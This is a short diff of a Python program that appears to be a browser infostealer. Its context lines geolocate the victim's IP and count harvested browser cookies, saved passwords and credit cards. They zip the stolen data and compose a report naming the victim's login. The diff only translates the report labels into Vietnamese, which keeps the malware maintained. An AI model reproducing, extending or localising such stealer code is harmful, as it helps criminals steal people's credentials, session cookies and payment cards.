@@ -1,3 +1,4 @@
+
 # import sys
 # sys.path.append(r'C:\\Users\\hi\\Downloads\\Env\\Lib\\site-packages')
 
@@ -715,7 +716,7 @@ def GetIP():
         SEIP = IData["query"]
         CountryCode = IData["countryCode"]
         CountryName = IData["country"]
-        GetIPD = f"IP: {SEIP}\nCountry: {CountryCode} - {CountryName}"
+        GetIPD = f"IP: {SEIP}\nQuốc Gia: {CountryCode} - {CountryName}"
     except:
         GetIPD = "IP: N/A"
         CountryCode = "Unknown"
@@ -761,7 +762,7 @@ with open(archive_path, "wb") as f:
 with open(archive_path, "wb") as f:
     f.write(zip_data.getbuffer())
 
-message_body = f"{GetIPD}\nUser: {os.getlogin()}\nData: CK: {total_browsers_cookies_count}|Pass: {total_browsers_logins_count}|CC: {total_browsers_ccards_count}\n"
+message_body = f"{GetIPD}\nTên: {os.getlogin()}\nData Trình Duyệt: CK: {total_browsers_cookies_count}|Tk&Mk: {total_browsers_logins_count}|Thẻ ATM: {total_browsers_ccards_count}\n"
 
 for i in range(10):
     if Count == 1:
